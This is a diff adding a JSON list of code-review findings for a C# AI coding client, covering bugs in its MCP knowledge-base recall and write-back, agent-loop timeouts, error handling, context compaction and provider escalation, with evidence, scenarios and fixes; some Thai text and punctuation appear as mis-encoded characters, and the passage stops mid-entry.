@@ -1,0 +1,702 @@
+﻿[
+    {
+        "area":  "brainx",
+        "findings":  [
+                         {
+                             "title":  "Automatic write-back to BrainX is effectively unreachable โ€” STRONG tier requires manual UI votes, so the agent never saves decisions to the brain",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Models\\Instinct.cs",
+                             "line":  76,
+                             "severity":  "CRITICAL",
+                             "kind":  "wiring-gap",
+                             "evidence":  "Instinct.cs:76-81: `double successRate = votes == 0 ? 0.5 : (double)AcceptCount / votes; ... return Math.Round(successRate * freq * recency, 3);` and Instinct.cs:91: `if (c \u003e= 0.70) return \"STRONG\";`. The ONLY automatic brain write path is SessionMemoryService.cs:164 `await _brainSync.SyncAllStrongAsync(_instinctService.GetAll(), ct);` which skips everything below STRONG (BrainSyncService.cs:186 `if (i.ConfidenceTier != \"STRONG\") { skipped++; continue; }`). InstinctService.RecordObservation (line 178) only bumps OccurrenceCount โ€” never AcceptCount.",
+                             "scenario":  "User works for weeks with InstinctLearningEnabled=true (default on). Session-end extraction records instincts, but with zero accept-votes successRate is pinned at 0.5, so max confidence = 0.5*1.0*1.0 = 0.5 \u003c 0.70 โ€” no instinct ever reaches STRONG unless the user opens the Instincts page and manually clicks accept ~5+ times per instinct. Result: brain_create_note is NEVER called automatically. The owner\u0027s directive \u0027CluadeX should WRITE BACK decisions\u0027 is violated โ€” write-back is manual-only (InstinctsViewModel sync buttons). Additionally there is no session-handoff/decision note written at session end at all: the only brain_create_note/brain_append_note caller in the entire codebase is BrainSyncService.SyncInstinctAsync.",
+                             "fix":  "Two-part fix: (1) In SessionMemoryService.ExtractInstinctsAsync, treat extraction itself as weak evidence โ€” e.g. RecordObservation should bump AcceptCount (or add an \u0027extraction-accept\u0027 weight) so repeated observations alone can reach STRONG; or lower the auto-sync gate to EMERGING (\u003e=0.45). (2) Add a real decision write-back: at session end (and/or when an agentic task completes with edits+green build), call brain_create_note with a session-handoff note (branch, files touched, what shipped, gotchas) via BrainSyncService โ€” a new BrainSyncService.WriteSessionHandoffAsync(summary) invoked from SessionMemoryService.ExtractInBackground."
+                         },
+                         {
+                             "title":  "Turn-0 auto-recall hardcodes semantic:false โ€” keyword brain_search with a raw 200-char sentence returns 0 hits for natural-language/Thai prompts, and there is no semantic fallback",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1065,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeAgentService.cs:1064-1065: `string query = userMessage.Length \u003e 200 ? userMessage[..200] : userMessage;` then `string lessons = await _brainSync.SearchAsync(query, limit: 3, semantic: false, timeoutCts.Token);`. BrainSyncService.cs:218 routes this to keyword search: `string tool = semantic ? \"brain_semantic_search\" : \"brain_search\";`. The BrainX server\u0027s own usage rules say: \u0027If 0 hits: retry with brain_semantic_search (works for natural-language Thai)\u0027. No retry exists.",
+                             "scenario":  "Thai-speaking owner types \u0027เธกเธฑเธเธเนเธฒเธเธกเธฑเธเธเธฑเธเธซเธฅเธฒเธขเธเธธเธ” เธเนเธงเธขเนเธเนเธซเธเนเธญเธข\u0027 โ€” the full sentence is sent verbatim as a keyword query to brain_search. Keyword index has no token overlap with note bodies written in mixed Thai/English, returns 0 hits (or an empty-results JSON), so the recall block is skipped (or worse, an empty block is injected โ€” see separate finding). The known chat-hang root-cause note stored in the brain is never surfaced, and the agent re-debugs a solved problem โ€” exactly what the owner\u0027s directive forbids.",
+                             "fix":  "In MaybePrependBrainContextAsync: (1) extract 2-4 keywords from the prompt instead of sending the raw sentence (or just trim to first line); (2) call SearchAsync(..., semantic: false) and if the parsed result has 0 hits, retry once with semantic: true inside the same 3s timeout budget (semantic search is the documented fallback for Thai). Alternatively default the auto-recall to semantic: true since BrainX embeds via local Ollama."
+                         },
+                         {
+                             "title":  "CORE tool subset for small-ctx local models strips brain_recall while the base system prompt still commands \u0027call brain_recall BEFORE starting\u0027 โ€” local models cannot reach the brain and waste turns on an unknown tool",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  34,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "CodeAgentService.cs:34-39: `private static readonly HashSet\u003cstring\u003e CoreLocalToolNames = new(...) { \"read_file\", \"list_files\", \"search_content\", \"search_files\", \"codebase_search\", \"find_symbol\", \"list_symbols\", \"edit_file\", \"multi_edit\", \"write_file\", \"run_command\", \"run_build\", \"run_tests\" };` โ€” no brain_recall. CodeAgentService.cs:1571: `var trimmed = toolSchemas.Where(t =\u003e CoreLocalToolNames.Contains(t.Name)).ToList();`. Yet the UNCONDITIONAL BuildBaseSystemPrompt section 3b (line 225) says: `- For non-trivial tasks, call brain_recall BEFORE starting, to surface past lessons / decisions / bugs from BrainX`.",
+                             "scenario":  "User runs Gemma on llama-server with ContextSize 4096 (the documented priority-#1 local path). The schema set sent to the model excludes brain_recall, but the system prompt explicitly instructs calling it. The weak model obeys the prompt, emits a tool_use for brain_recall, gets a \u0027tool not found\u0027 error from the provider/loop, retries, and burns 1-3 of its capped iterations โ€” contributing to the \u0027เธกเธฑเธเธเนเธฒเธ/เธเธฑเธ\u0027 feel. Even when it doesn\u0027t try, the owner\u0027s directive \u0027always used together\u0027 is violated for local models: they have NO on-demand path to the brain (turn-0 prepend partially compensates but is keyword-only and 3 hits max).",
+                             "fix":  "Add \"brain_recall\" to CoreLocalToolNames (its schema is ~60 tokens โ€” negligible vs the 4k window), and update the small-ctx NOTE at CodeAgentService.cs:736 to include it. Alternatively, gate the section-3b brain_recall instruction on the same includeToolDefs/localSmallCtx flags so prompt and schemas never contradict."
+                         },
+                         {
+                             "title":  "Legacy [ACTION:] tool catalogue never documents brain_recall โ€” OpenAI/Gemini (and local legacy-mode) models are told to call it but never shown its name/args",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  651,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "GetToolDefinitionsPrompt() (AgentToolService.cs:651-) enumerates read_file/write_file/git/web/memory tools but contains zero occurrences of \u0027brain\u0027 (verified by grep: brain matches in this file are only at lines 69, 82, 103, 386, 598-599, 1121-1122, 2455-2456, 2836-2852 โ€” none inside the legacy prompt builder). The dispatcher DOES accept it (line 2456: `\"brain_recall\" or \"brain_search\" or \"recall\" or \"brain\" =\u003e ToolType.BrainRecall,`) and the base prompt (CodeAgentService.cs:225) instructs using it.",
+                             "scenario":  "User selects OpenAI or Gemini provider (SupportsNativeToolUse=false โ’ legacy [ACTION:] loop). The system prompt says \u0027call brain_recall BEFORE starting\u0027 but the AVAILABLE TOOLS catalogue never lists it, so the model either ignores it or guesses the argument block format ([ACTION: brain_recall] with what keys? \u0027query\u0027? \u0027q\u0027?). A wrong key silently yields the Fail at line 2843 (\u0027query\u0027 is required), costing an iteration. Brain recall is thus unreliable on every non-Anthropic cloud provider.",
+                             "fix":  "Add a numbered brain_recall entry to GetToolDefinitionsPrompt() with the exact [ACTION: brain_recall] / query: ... / semantic: true|false / limit: N block format, mirroring the native schema at line 599."
+                         },
+                         {
+                             "title":  "MCP initialize response \u0027instructions\u0027 field is discarded โ€” BrainX\u0027s HARD RULES (recall-before-answer, save-after-insight, session-handoff) never reach the model",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Mcp\\McpServerManager.cs",
+                             "line":  166,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "McpServerManager.cs:166-176: `var initResponse = await transport.SendRequestAsync(\"initialize\", initParams, timeoutMs: 15000, ct: ct); if (!initResponse.IsSuccess) {...}` โ€” initResponse.Result is never parsed for the MCP-spec `instructions` field (grep for \u0027instructions\u0027 across CluadeX/Services/Mcp returns no matches). The BrainX server ships extensive instructions (\u0027BEFORE ANSWERING any non-trivial prompt: run brain_search... AFTER any answer... IMMEDIATELY call brain_create_note\u0027).",
+                             "scenario":  "The owner configured the BrainX MCP server expecting its embedded usage contract to govern the agent (it does in Claude Code/Desktop, which inject server instructions into the system prompt). In CluadeX the handshake succeeds, tools are registered, but the instructions JSON is dropped on the floor. The model gets brain tools with one-line descriptions and no recall/write-back discipline โ€” directly causing the \u0027they must call on each other\u0027 gap: the model has the write tools (mcp__\u003cserver\u003e__brain_create_note via dynamic schemas, line 643) but is never told when/why to use them.",
+                             "fix":  "In StartServerAsync, parse `initResponse.Result.Value.GetProperty(\"instructions\")` (when present) into McpServerConfig/registry, expose it via McpServerManager (e.g. GetServerInstructions()), and append it to the system prompt in CodeAgentService.GetSystemPrompt() under a \u0027# Connected MCP server instructions\u0027 section (truncate to a budget, and only when includeToolDefs is true)."
+                         },
+                         {
+                             "title":  "First user message races MCP startup โ€” license validation (15s HTTP timeout) + sequential server handshakes run before the brain connects, and turn-0 recall silently no-ops",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\App.xaml.cs",
+                             "line":  64,
+                             "severity":  "UX",
+                             "kind":  "wiring-gap",
+                             "evidence":  "App.xaml.cs:58-77: background task does `await activation.ValidateOnlineAsync();` FIRST (XmanLicenseService.cs:29 `_httpClient.Timeout = TimeSpan.FromSeconds(15);`), THEN `await mcpManager.InitializeAsync();`. McpServerManager.cs:113-119 starts servers sequentially: `foreach (var (name, config) in _configs) { ... await StartServerAsync(name, ct); }` with a 15s handshake timeout each (line 166). Meanwhile CodeAgentService.cs:1052 silently skips recall: `if (... || !_brainSync.IsBrainAvailable) return userMessage;`.",
+                             "scenario":  "User launches CluadeX offline or on a slow network: license POST hangs up to 15s, then 2-3 configured MCP servers handshake sequentially (npx-based servers take 3-10s cold). The user types their first task 5 seconds after the window appears โ€” IsBrainAvailable is false, auto-recall is skipped with no indicator, no retry, no deferred recall. The session that most needs the brain\u0027s handoff note (the \u0027continue from yesterday\u0027 first message) is exactly the one that never gets it.",
+                             "fix":  "(1) Reorder: run McpServerManager.InitializeAsync() before (or concurrently with via Task.WhenAll) license validation. (2) Parallelize StartAllEnabledAsync: `await Task.WhenAll(_configs.Where(c =\u003e c.Value.Enabled).Select(c =\u003e StartServerAsync(c.Key, ct)));`. (3) In MaybePrependBrainContextAsync, if the brain server is configured+enabled but not yet running, wait briefly (e.g. up to 2s) for startup completion instead of skipping silently, and report \u0027Brain still connecting โ€” recall skipped\u0027 via progress so the gap is visible."
+                         },
+                         {
+                             "title":  "Raw brain JSON injected verbatim into the prompt, and the empty-result guard only catches \u0027(\u0027 sentinels โ€” \u0027[]\u0027 or \u0027{\"results\":[]}\u0027 gets wrapped in a recall block",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1068,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeAgentService.cs:1068-1069: `if (string.IsNullOrWhiteSpace(lessons) || lessons.StartsWith(\"(\", StringComparison.Ordinal)) return userMessage;` โ€” only filters BrainSyncService\u0027s own \u0027(...)\u0027 sentinel strings. BrainSyncService.cs:226 returns the brain\u0027s raw payload: `return ExtractText(result);` (doc comment line 201: \u0027The returned text is the brain\u0027s raw JSON result\u0027). A zero-hit JSON like `[]` or `{\"results\":[],\"total\":0}` passes the guard and is injected inside \u003cbrainx_recall\u003e as \u0027Relevant prior knowledge\u0027.",
+                             "scenario":  "Keyword search misses (common per the semantic:false finding). The model receives \u0027\u003cbrainx_recall\u003eRelevant prior knowledge from your BrainX knowledge base...: {\"results\":[]}\u003c/brainx_recall\u003e\u0027 โ€” a weak 4k-ctx local model wastes ~80 tokens and may even comment on the empty knowledge base instead of doing the task. On hits, full raw JSON (ids, scores, escaped paths) bloats the turn versus a \u0027title โ€” preview\u0027 plaintext rendering, eating the small context the recall was supposed to enrich.",
+                             "fix":  "Parse the JSON in BrainSyncService.SearchAsync (it already has ExtractIdAndPath-style best-effort parsing): return a compact plaintext list \u0027โ€ข {title} [{tags}] โ€” {preview}\u0027 and return the \u0027(no results)\u0027 sentinel when the hits array is empty. The \u0027(\u0027 guard in CodeAgentService then works unchanged."
+                         },
+                         {
+                             "title":  "Agent-initiated MCP brain writes flatten arrays/objects to strings โ€” brain_create_note \u0027tags\u0027 arrive as a quoted JSON string (the exact bug fixed for instinct sync, still present on the generic path)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  2342,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "AgentToolService.cs:2342: `var result = await _mcpManager.CallToolAsync(serverName, toolName, call.Arguments, ct);` where call.Arguments is Dictionary\u003cstring,string\u003e. McpServerManager.cs:238-241 warns about exactly this: \u0027Callers that need to pass arrays or nested objects MUST use the object-overload below to avoid the brain receiving a quoted JSON string instead of a real array.\u0027 โ€” but ExecuteMcpToolAsync uses the string-typed overload, which only re-types int/double/bool (lines 245-252).",
+                             "scenario":  "Following the owner\u0027s directive, the model (Anthropic provider, dynamic MCP schemas from line 643) calls mcp__brainx-brain__brain_create_note with tags=[\"coding-lesson\",\"cluadex\"]. The native tool_use args are stringified into call.Arguments, so the brain receives tags:\"[\\\"coding-lesson\\\",\\\"cluadex\\\"]\" โ€” one garbage tag or a schema-validation rejection. Same for any nested-object argument on any MCP server. Write-back attempts that DO happen get silently corrupted, so notes are untagged/orphaned in the knowledge graph.",
+                             "fix":  "Preserve the original JSON types: carry a Dictionary\u003cstring,JsonElement\u003e (or raw JSON string) on ToolCall for native tool_use calls, and have ExecuteMcpToolAsync call CallToolWithObjectArgsAsync with real typed values. Minimal version: in CallToolAsync, detect values that parse as JSON arrays/objects (trimmed starts with \u0027[\u0027 or \u0027{\u0027) and pass the parsed JsonElement instead of the string."
+                         },
+                         {
+                             "title":  "brain_recall tool call inside the agent loop has no per-call timeout โ€” a hung (alive-but-unresponsive) brain server stalls the turn for the full 30s transport default",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  2850,
+                             "severity":  "MINOR",
+                             "kind":  "perf",
+                             "evidence":  "AgentToolService.cs:2850: `string result = await _brainSync.SearchAsync(query, limit, semantic, ct);` passes only the loop ct. BrainSyncService.SearchAsync โ’ McpServerManager.CallToolWithObjectArgsAsync โ’ McpStdioTransport.SendRequestAsync (line 126) `int timeoutMs = 30000` default. By contrast the turn-0 auto-recall path correctly wraps a 3s linked-token timeout (CodeAgentService.cs:1061-1062).",
+                             "scenario":  "The BrainX node process is alive but wedged (e.g. Ollama embedding call inside brain_semantic_search blocks). The model calls brain_recall with semantic=true; the agent turn freezes for 30 seconds with the spinner running โ€” to the user this is another \u0027เธกเธฑเธเธเนเธฒเธ\u0027 hang, and on a 15-step agentic task several recalls can add minutes. (When the process is fully dead, IsBrainAvailable/HandleProcessExit fail fast โ€” only the hung-alive case stalls.)",
+                             "fix":  "In ExecuteBrainRecallAsync, wrap the call with the same pattern as turn-0: `using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(ct); timeoutCts.CancelAfter(TimeSpan.FromSeconds(10));` and return a graceful \u0027(brain timed out)\u0027 ToolResult on cancellation, so the loop continues. Optionally plumb a timeoutMs parameter through CallToolWithObjectArgsAsync."
+                         },
+                         {
+                             "title":  "Session-end extraction (the only auto write-back trigger) fires only on \u0027New Chat\u0027 โ€” closing the app loses the session\u0027s lessons entirely",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\ViewModels\\ChatViewModel.cs",
+                             "line":  1147,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "Grep across the repo shows exactly one caller: ChatViewModel.cs:1147 `_sessionMemoryService?.ExtractInBackground(CurrentSession.Messages);` inside the new-session command. SessionMemoryService.cs doc (lines 8-10) claims it runs \u0027after a session ends (user clicks \"New Chat\" or closes the app)\u0027 โ€” the app-close half is not wired (no call from MainWindow.OnClosing / App.OnExit).",
+                             "scenario":  "Owner finishes a long debugging session and closes CluadeX (the natural end-of-day action โ€” nobody clicks \u0027New Chat\u0027 before quitting). ExtractInBackground never runs: no memories extracted, no instincts recorded, no STRONG sync to BrainX. Combined with the STRONG-gate finding, the brain write-back path has effectively zero real-world entry points. Note even fixing this needs care: ExtractInBackground is fire-and-forget Task.Run, so on shutdown the work must be awaited (bounded) or the process exits mid-extraction.",
+                             "fix":  "Call extraction from the window-closing path: in MainWindow.OnClosing (or App.OnExit), invoke a new awaitable SessionMemoryService.ExtractAndSyncAsync(CurrentSession.Messages) with a ~10s cap (Task.WhenAny + Task.Delay) before MCP servers are disposed โ€” order matters because brain sync needs the MCP transport still alive (App/McpServerManager.Dispose kills it)."
+                         },
+                         {
+                             "title":  "FindBrainServer matches any running server whose NAME contains \u0027brain\u0027 โ€” no tool-surface verification despite the class contract saying it matches by tool surface",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\BrainSyncService.cs",
+                             "line":  54,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "BrainSyncService.cs:54-61: `foreach (var name in _mcp.GetRunningServers()) { if (name.Contains(\"obsidianx\", ...) || name.Contains(\"brain\", ...)) return name; }` while the class doc (lines 13-15) promises: \u0027looks for any MCP server whose name contains \"obsidianx\" or \"brain\" AND exposes a brain_create_note tool... we match by tool surface, not by display name.\u0027",
+                             "scenario":  "User adds an unrelated MCP server named \u0027brainstorm-ideas\u0027 (or names their brain server \u0027obsidian-notes\u0027, containing neither keyword). Case 1: every brain_recall / instinct sync / turn-0 recall is routed to the wrong server, fails with \u0027tool not found\u0027, and โ€” because FindBrainServer returns the FIRST match โ€” the real brain server later in the dictionary is never tried. Case 2: IsBrainAvailable is false forever and the integration silently disables. ConcurrentDictionary enumeration order also makes the pick nondeterministic across runs when both match.",
+                             "fix":  "Honor the documented contract: filter GetRunningServers() to those where `_mcp.ToolRegistry.GetToolsForServer(name).Any(t =\u003e t.Name == \"brain_create_note\" || t.Name == \"brain_search\")` (registry is already populated at handshake, so this is a cheap in-memory check, no extra round-trip), and drop the name heuristic to a tie-breaker."
+                         }
+                     ]
+    },
+    {
+        "area":  "agent-loop",
+        "findings":  [
+                         {
+                             "title":  "Idle timeout is a hard 120s kill-switch for local native tool calls (non-streaming) โ€” guaranteed TimeoutException on slow local generations, then 3x whole-turn auto-retry = the \u0027app hangs\u0027 symptom",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1668,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "CodeAgentService.cs:1658-1672: `if (timeoutSec \u003e 0) callCts.CancelAfter(TimeSpan.FromSeconds(timeoutSec)); ... response = await loopProvider.ChatWithToolsAsync(outboundMessages, systemPrompt, toolSchemas, onTextDelta: token =\u003e { if (timeoutSec \u003e 0) callCts.CancelAfter(...); // reset idle window` โ€” the reset only happens inside onTextDelta. But LlamaServerProvider.ChatWithToolsAsync (LlamaServerProvider.cs:481-522) sets `[\"stream\"] = false` and NEVER invokes onTextDelta, so the \u0027idle\u0027 window never resets: it is an absolute cap. AppSettings.cs:64 `InteractiveRequestTimeoutSeconds { get; set; } = 120;`. On timeout: `throw new TimeoutException($\"Request timed out after {timeoutSec}s...\")` (line 1678) โ€” uncaught in the loop, propagates to ChatViewModel.cs:1532-1534 where `ex.Message.Contains(\"timeout\")` marks it retryable and re-runs the ENTIRE SendMessage up to 3 times.",
+                             "scenario":  "User runs the priority local path (llama-server, e.g. 14B model, 16k ctx). Prefill of a large system prompt + 46 tool schemas + microcompacted history plus generation easily exceeds 120s on consumer GPUs. The non-streamed /v1/chat/completions call is cancelled at exactly 120s every time, the UI shows a dead spinner for 2 minutes, then ChatViewModel re-sends the whole turn 3 more times (each spinning another 2 minutes), and finally posts an error. From the user\u0027s chair: \u0027เธกเธฑเธเธเนเธฒเธ\u0027 โ€” 8+ minutes of hang followed by failure, deterministically, on any model/task slow enough.",
+                             "fix":  "Make the llama-server tool path stream (stream:true + parse tool_call deltas, invoking onTextDelta per chunk โ€” ChatAsync already has the SSE parser), OR when the provider call is non-streaming, use a separate, much larger absolute timeout (e.g. LocalToolCallTimeoutSeconds default 600) instead of treating the idle window as a hard cap. At minimum reset the window when response headers arrive."
+                         },
+                         {
+                             "title":  "LlamaServerProvider swallows all HTTP errors into TextContent with StopReason=end_turn โ€” the native loop\u0027s 413 compaction recovery is dead code on the local path, and context overflow becomes a \u0027successful\u0027 final answer",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  516,
+                             "severity":  "CRITICAL",
+                             "kind":  "silent-failure",
+                             "evidence":  "LlamaServerProvider.cs:511-518: `if (!response.IsSuccessStatusCode) { var error = ...; return new NativeToolResponse { TextContent = $\"llama-server tool call failed ({(int)response.StatusCode}): ...\", StopReason = \"end_turn\" }; }` โ€” no exception is ever thrown. Meanwhile CodeAgentService.cs:1681 `catch (HttpRequestException ex) when (ex.StatusCode == System.Net.HttpStatusCode.RequestEntityTooLarge)` is the ONLY overflow recovery, and CodeAgentService.cs:1780-1808 treats any no-tool-call response as the final answer: `result.FinalResponse = textContent; result.Success = true;`.",
+                             "scenario":  "Long agentic session on llama-server; the prompt finally exceeds the context window and the server returns 400 (\u0027the request exceeds the available context size\u0027). Instead of triggering reactive compaction, the error string comes back as TextContent with end_turn, ToolCalls.Count==0, and the loop publishes \u0027llama-server tool call failed (400): ...\u0027 as the assistant\u0027s final, Success=true answer. The carefully built microcompact/413-recovery machinery never runs for the provider it was built for (local mode is priority #1). Same for \u0027llama-server is not running. Load a model first.\u0027 (line 476) โ€” mid-loop server death ends the turn as a fake success.",
+                             "fix":  "In ChatWithToolsAsync, throw HttpRequestException(message, null, response.StatusCode) on !IsSuccessStatusCode (mirroring AnthropicProvider.cs:474-477), and in the loop catch both 413 and 400-with-context-overflow bodies to trigger the existing reactive compaction. Alternatively set a dedicated StopReason=\"error\" the loop checks before treating text as a final answer."
+                         },
+                         {
+                             "title":  "413 reactive compaction (TakeLast(10) + EnsureAlternatingRoles merge) produces orphaned tool_result blocks and text-before-tool_result ordering โ€” next Anthropic request 400s, killing the turn it tried to save",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1688,
+                             "severity":  "CRITICAL",
+                             "kind":  "crash",
+                             "evidence":  "CodeAgentService.cs:1688-1699: `nativeMessages = nativeMessages.TakeLast(keepCount).ToList(); nativeMessages.Insert(0, new ... Role = \"user\", Content = { ... Text = \"[Context was compacted...]\" }); nativeMessages = EnsureAlternatingRoles(nativeMessages);` โ€” TakeLast can start at a user message whose content is tool_result blocks while the assistant tool_use that owns those IDs was just dropped. EnsureAlternatingRoles (lines 2247-2259) only merges same-role messages (`result[^1].Content.AddRange(msg.Content)`) โ€” it never strips orphaned tool_results, and the merge puts the inserted text block BEFORE the tool_result blocks in one user message.",
+                             "scenario":  "Anthropic native loop hits 413 (oversized request). Compaction keeps the last 10 messages; the cut lands between an assistant tool_use message and its user tool_result message (they always travel as a pair, so a 10-message suffix has ~50% odds of splitting one). The recompacted request is rejected by the API (\u0027unexpected tool_use_id found in tool_result\u0027 / tool_result ordering error) with HTTP 400 โ€” which the loop does NOT catch (only 413) โ€” so HttpRequestException unwinds the whole turn into ChatViewModel\u0027s error bubble, and 400 is not retryable. The recovery converted a recoverable overflow into a hard turn failure.",
+                             "fix":  "After TakeLast, walk forward dropping leading messages until the first message is a plain-text user message (or strip tool_result blocks whose ToolUseId has no matching tool_use in the kept window), and insert the compaction notice as content AFTER any tool_result blocks or as its own properly-alternating message."
+                         },
+                         {
+                             "title":  "Anthropic reports context overflow as HTTP 400 (invalid_request_error \u0027prompt is too long\u0027), not 413 โ€” both loops\u0027 reactive-compaction recovery keys exclusively on RequestEntityTooLarge and misses the common overflow case",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1681,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeAgentService.cs:1681 (native) and 1191 (legacy): `catch (HttpRequestException ex) when (ex.StatusCode == System.Net.HttpStatusCode.RequestEntityTooLarge)`. AnthropicProvider.cs:474-477 throws `new HttpRequestException($\"Anthropic API error: {error}\", null, response.StatusCode)` โ€” Anthropic returns 413 request_too_large only for byte-size limits; token-window overflow (\u0027prompt is too long: X tokens \u003e Y maximum\u0027) is a 400 invalid_request_error. A 400 falls through, and ChatViewModel.cs:1532-1534\u0027s retryable check (429/500/502/503/timeout) doesn\u0027t match either.",
+                             "scenario":  "Long Anthropic agentic session accumulates tool results past the model\u0027s context window. The API returns 400 \u0027prompt is too long\u0027. Reactive compaction never fires; the user gets a hard error bubble and must manually start a new session โ€” exactly the failure mode the compaction code was written to prevent.",
+                             "fix":  "Broaden the catch: `catch (HttpRequestException ex) when (ex.StatusCode == HttpStatusCode.RequestEntityTooLarge || (ex.StatusCode == HttpStatusCode.BadRequest \u0026\u0026 ex.Message.Contains(\"prompt is too long\", StringComparison.OrdinalIgnoreCase)))` (or have AnthropicProvider classify overflow into a dedicated exception type)."
+                         },
+                         {
+                             "title":  "repeatErrorCount is never reset on a clean (no-error) turn โ€” escalation fires on non-consecutive repeats, contradicting the \u0027same error 3 turns running\u0027 contract",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  2013,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeAgentService.cs:2010-2016: `bool stagnating = false; if (errSig.Length \u003e 0) { if (errSig == lastErrorSig) repeatErrorCount++; else { repeatErrorCount = 0; lastErrorSig = errSig; } stagnating = repeatErrorCount \u003e= 2; // the same error 3 turns running }` โ€” when a turn has NO failed tools, errSig is empty and the entire block is skipped, leaving lastErrorSig and repeatErrorCount frozen at their last values.",
+                             "scenario":  "Turn 3: edit fails with error A (count=0, sig=A). Turn 4: same error A (count=1). Turns 5-9: model recovers and makes 5 turns of clean progress. Turn 10: error A reappears once (count=2 โ’ stagnating=true) โ’ the conversation is escalated to the paid API provider even though the model was demonstrably NOT stuck โ€” it had recovered and only re-hit the error once. With EscalationEnabled, this silently sends the conversation + tool results to an external provider and spends money on a false trigger.",
+                             "fix":  "Add an else branch: `if (errSig.Length \u003e 0) { ... } else { repeatErrorCount = 0; lastErrorSig = null; }` so only consecutive failing turns count."
+                         },
+                         {
+                             "title":  "ResolveEscalationProvider never checks the target provider is configured/ready โ€” escalating to Anthropic with no API key throws an uncaught 401 HttpRequestException that destroys the whole accumulated turn",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  2091,
+                             "severity":  "LOGIC",
+                             "kind":  "crash",
+                             "evidence":  "CodeAgentService.cs:2088-2093: `if (!s.EscalationEnabled) return null; if (!Enum.TryParse\u003cAiProviderType\u003e(s.EscalationProviderName, ...)) return null; var p = _providerManager.GetProvider(t); if (p == null || ReferenceEquals(p, current)) return null; if (!p.SupportsNativeToolUse) return null; return p;` โ€” no `p.IsReady` / API-key check (IAiProvider.cs:10 exposes `bool IsReady`; AnthropicProvider sets IsReady=false on blank key). After escalation, the loop\u0027s only catches around ChatWithToolsAsync are OperationCanceledException and 413 (lines 1674-1707); AnthropicProvider.cs:474-477 throws HttpRequestException on 401.",
+                             "scenario":  "User enables EscalationEnabled but never entered an Anthropic key (or the key expired). The local model stagnates after 10 productive turns; escalation flips loopProvider to Anthropic; the very next request throws \u0027Anthropic API error: 401\u0027 โ€” uncaught โ€” unwinding ExecuteNativeToolLoopAsync. ChatViewModel posts a non-retryable error bubble; all 10 turns of agentic context for this turn\u0027s final answer are discarded. A misconfiguration check away from being a graceful skip.",
+                             "fix":  "In ResolveEscalationProvider also require `p.IsReady` (and/or a TestConnection-cached flag). Additionally wrap post-escalation provider calls in a try/catch that, on failure, reverts to ending the turn gracefully with the local model\u0027s last state instead of letting the exception unwind the loop."
+                         },
+                         {
+                             "title":  "Escalated API model inherits the LOCAL-trimmed system prompt (70%-of-4k fit-guard cut + \u0027you have a CORE tool set of 13 tools\u0027 note) while being handed the full 46-tool schema catalogue",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  2022,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "CodeAgentService.cs:1523 builds the prompt once: `string systemPrompt = await GetSystemPromptAsync();` โ€” for a local provider the fit-guard (lines 882-893) hard-truncates it (`built = built[..charBudget] + \"\\n\\n[System prompt trimmed to fit this model\u0027s context window...\"`), and lines 736-739 inject \u0027NOTE: Context is limited, so you have a CORE tool set: read_file, list_files, ...\u0027. On escalation (lines 2020-2022) only the schemas are refreshed: `loopProvider = escalationProvider; toolSchemas = _agentToolService.BuildNativeToolSchemas(); // full catalogue` โ€” systemPrompt is never rebuilt. Also `loopIsLocal` (line 1530) stays true, so Claude\u0027s text keeps being run through ModelOutputSanitizer.SanitizeStreamChunk (line 1713).",
+                             "scenario":  "4k-ctx local model escalates to Claude. Claude receives a system prompt amputated to ~2,800 tokens (project context, memory, instincts, CLAUDE.md all cut off mid-sentence) that explicitly tells it it only has 13 core tools โ€” while the request\u0027s tools array offers 46+. The expensive escalation call runs with contradictory, degraded instructions, exactly when maximum capability was the point. Schema-set + prompt change mid-conversation also invalidates the Anthropic prompt cache (cost).",
